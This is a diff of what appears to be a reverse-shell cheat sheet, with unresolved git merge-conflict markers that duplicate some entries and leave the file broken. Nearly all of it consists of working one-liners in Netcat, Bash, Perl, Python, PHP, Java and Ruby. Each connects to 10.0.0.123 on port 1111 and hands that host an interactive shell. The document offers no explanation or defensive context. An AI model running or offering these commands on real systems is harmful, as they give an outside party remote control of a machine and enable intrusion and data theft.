@@ -1,3 +1,4 @@
+<<<<<<< HEAD
 Netcat Reverse Shell
 
 	nc -e /bin/sh 10.0.0.123 1111
@@ -26,4 +27,34 @@ Java Reverse Shell
 
 Ruby Reverse Shell
 
+=======
+Netcat Reverse Shell
+
+	nc -e /bin/sh 10.0.0.123 1111
+
+Bash Reverse Shell
+
+	/bin/bash -i >& /dev/tcp/10.0.0.123/1111 0>&1
+
+Perl Reverse Shell
+
+	perl -e 'use Socket;$i="10.0.0.123";$p=1111;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+Python Reverse Shell
+
+	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.123",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+PHP Reverse Shell
+
+	php -r '$sock=fsockopen("10.0.0.123",1111);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+Java Reverse Shell
+
+	r = Runtime.getRuntime()
+	p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.123/1111;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+	p.waitFor()
+
+Ruby Reverse Shell
+
+>>>>>>> 2bb1d6831671b5c20be4b37b2262c7ca51cd61a1
 	ruby -rsocket -e'f=TCPSocket.open("10.0.0.123",1111).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
